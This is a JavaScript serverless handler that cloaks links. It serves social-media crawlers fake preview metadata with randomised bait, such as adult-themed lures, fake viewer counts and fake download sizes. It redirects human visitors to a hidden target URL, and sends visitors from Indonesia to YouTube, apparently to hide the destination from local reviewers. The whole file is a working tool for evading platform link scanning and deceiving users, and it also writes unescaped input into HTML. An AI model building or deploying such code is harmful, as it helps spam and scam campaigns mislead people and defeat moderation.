export async function onRequest(context) {
    const { params, request } = context;
    const base64Data = params.path[0];
    const userAgent = request.headers.get("user-agent") || "";
    
    // Deteksi Negara
    const country = request.cf ? request.cf.country : "Unknown";

    if (!base64Data || base64Data === "index.html") {
        return context.next();
    }

    try {
        const data = JSON.parse(atob(base64Data));
        const title = data.t || "Premium Content"; // Title bersih sesuai input
        const image = data.i || "";
        const target = data.u || "";

        // 1. GENERATE RANDOM DESKRIPSI (Tetap pakai emoji/angka)
        const count = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
        const formattedCount = count.toLocaleString('en-US');
        
        const themes = [
            { d: `▶️ ${formattedCount} girls ready for you...`, type: "video.other" },
            { d: `💰 Premium Access: ${formattedCount} girls online`, type: "website" },
            { d: `💎 Exclusive Content: ${formattedCount} active members`, type: "website" },
            { d: `🔴 LIVE NOW: ${formattedCount} viewers watching`, type: "video.other" },
            { d: `📥 Download File (${formattedCount} MB) - Fast Link`, type: "website" }
        ];
        
        const s = themes[Math.floor(Math.random() * themes.length)];
        const isBot = /WhatsApp|facebookexternalhit|TelegramBot|Twitterbot|Slackbot/i.test(userAgent);

        // 2. Tampilan untuk Bot (Preview Sosmed)
        if (isBot) {
            return new Response(`<!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>${title}</title>
                <meta property="og:title" content="${title}" />
                <meta property="og:description" content="${s.d}" />
                <meta property="og:image" content="${image}" />
                <meta property="og:type" content="${s.type}" />
                <meta property="og:video:url" content="${image}" /> 
                <meta property="og:video:type" content="text/html" />
                <meta name="twitter:card" content="summary_large_image">
            </head>
            <body></body>
            </html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
        }

        // 3. LOGIC REDIRECT MANUSIA
        let finalTarget = target.trim();
        
        if (country === "ID") {
            // Khusus Indonesia ke YouTube
            finalTarget = "https://www.youtube.com"; 
        } else {
            // Selain Indonesia ke link target asli
            if (!/^https?:\/\//i.test(finalTarget)) {
                finalTarget = 'https://' + finalTarget;
            }
        }

        return Response.redirect(finalTarget, 302);

    } catch (e) {
        return context.next();
    }
}
